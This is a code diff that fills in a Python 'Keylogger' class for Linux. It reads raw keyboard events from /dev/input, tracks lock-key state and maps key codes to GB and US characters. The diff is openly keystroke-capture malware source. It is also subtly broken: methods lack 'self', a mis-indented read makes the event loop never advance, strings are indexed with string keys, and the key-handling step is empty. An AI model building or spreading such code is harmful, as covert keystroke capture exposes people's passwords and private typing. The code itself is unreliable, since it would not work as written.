@@ -11,7 +11,43 @@ class Keylogger:
               unsigned short code;
               unsigned int value;
             }"""
-        pass
+        struct_types = "llHHI"
+        struct_size = struct.calcsize(struct_types)
+
+        keyboard_device = self.get_keyboard_event()
+        if keyboard_device == -1: keyboard_device = "event3"
+
+        ctrl_shift_status = [0, 0]
+        caps_num_status = self.get_capsnum_lock()
+
+        alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        key_consts = self.parse_input_event_codes()
+        key_combs = self.set_combinations()
+
+        try:
+            f = open("/dev/input/{}".format(keyboard_device))
+            evnt = f.read(struct_size)
+
+            while evnt:
+                #update caps/num lock status
+                caps_num_status = self.get_capsnum_lock()
+
+                #unpacks event struct into tuple
+                (time1, time2, type_, code_, val_) = struct.unpack(struct_types, evnt)
+
+                #gets key value
+
+            evnt = f.read(struct_size)
+
+        except (FileNotFoundError, PermissionError):
+            raise Exception("Unable to read devices from /dev/input, please ensure you have permission to acess /dev/input/ files.")
+        except KeyboardInterrupt:
+            pass
+        except Exception as err:
+            print("The following excpetion caused the program to stop: \n{}".format(err))
+        finally:
+            try: f.close()
+            except: pass
 
     'Goes through input-event-codes.h getting key codes'
     def parse_input_event_codes():
@@ -26,7 +62,6 @@ class Keylogger:
 
         key_consts = {}
 
-        #parse data obtaining intial key-codes
         for line in f_data:
             if line[:11] != "#define KEY" and line[:11] != "#define BTN": continue
 
@@ -34,6 +69,9 @@ class Keylogger:
             const = re.sub(r"#define |[\n()]", "", line).replace("\t", " ").split(" ")
             const = [x for x in const if x]
             value, code = const[0], const[1]
+
+            #removes 'KEY_' that precedes actual value, A, MINUS, 0, etc.
+            if value[:3] == "KEY": value = value[4:]
 
             #converts code to int, leaves ref consts as strings ad it cant convert it to same value as another
             #constant because values are used as dict keys
@@ -43,9 +81,28 @@ class Keylogger:
 
         return key_consts
 
-    ' Changes key code values to ascii values, e.g. KEY_MINUS to -, and adds combinations dependant on the keyboard layout '
-    def key_code_to_ascii():
-        pass
+    ' Sets combinaion values for keys based on keyboard layout, currently on GB and US '
+    def set_combinations():
+        comb_vals = {}
+
+        #num key combinations
+        gb_num_chars_combs = ')!"£$%^&*('
+        us_num_chars_combs = ')!@#$%^&*('
+
+        for i in range(10):
+            comb_vals[i] = {"GB": gb_num_chars_combs[i]}
+            comb_vals[i]["US"] = us_num_chars_combs[i]
+
+        #NOTE: key_code_values are US as "input-event-codes.h" is US
+        key_code_values = ["MINUS", "EQUAL", "LEFTBRACE", "RIGHTBRACE", "SEMICOLON", "APOSTROPHE", "BACKSLASH", "COMMA", "DOT", "SLASH", "102ND", "GRAVE"]
+        gb_combs = "_+{}:@~<>?|¬"
+        us_combs = '_+{}:"|<>?>~'
+
+        for i in key_code_values:
+            comb_vals[i] = {"GB": gb_combs[i]}
+            comb_vals[i]["US"] = us_combs[i]
+
+        return comb_vals
 
     ' Gets current state of caps lock and nums lock keys '
     def get_capsnum_lock():
@@ -90,6 +147,7 @@ class Keylogger:
             handlers = l[5][12:].strip().split(" ")
             for h in handlers:
                 if "event" in h: return h
+        return -1
 
     ' Runs and returns output of a command '
     def run_process(command):
